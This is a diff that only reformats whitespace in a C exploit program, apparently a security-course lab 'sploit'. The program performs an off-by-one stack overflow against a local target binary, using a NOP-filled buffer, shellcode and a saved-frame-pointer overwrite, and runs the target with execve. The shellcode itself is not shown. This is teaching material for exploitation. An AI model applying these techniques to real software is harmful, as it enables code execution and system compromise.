@@ -17,12 +17,12 @@ int main(void)
 	// from the stack, which gives us full control.
 
 	// We make the explot one byte (+ null char) too large.
-	char sploitstring[202*sizeof(char)];
-	
+	char sploitstring[202 * sizeof(char)];
+
 	// Fill with NOOPs and null terminate.
 	memset(sploitstring, '\x90', sizeof(sploitstring));
 	sploitstring[sizeof(sploitstring) - 1] = 0;
-	
+
 	// The final byte overwrites part of $ebp stored in the stack frame of bar().
 	// By inspecting gdb, we modify this so it points into our buffer, since the
 	// processor will then copy this value to $esp (the stack pointer) and then
@@ -41,14 +41,14 @@ int main(void)
 
 	// We copy the shellcode into the buffer, minus the null-terminal.
 	memcpy(&sploitstring[sizeof(sploitstring) - (sizeof(shellcode) - 1) - 6],
-				 shellcode, sizeof(shellcode) - 1);
+	       shellcode, sizeof(shellcode) - 1);
 
 
-  char *args[] = { TARGET, sploitstring, NULL };
-  char *env[] = { NULL };
+	char *args[] = { TARGET, sploitstring, NULL };
+	char *env[] = { NULL };
 
-  execve(TARGET, args, env);
-  fprintf(stderr, "execve failed.\n");
+	execve(TARGET, args, env);
+	fprintf(stderr, "execve failed.\n");
 
-  return 0;
+	return 0;
 }
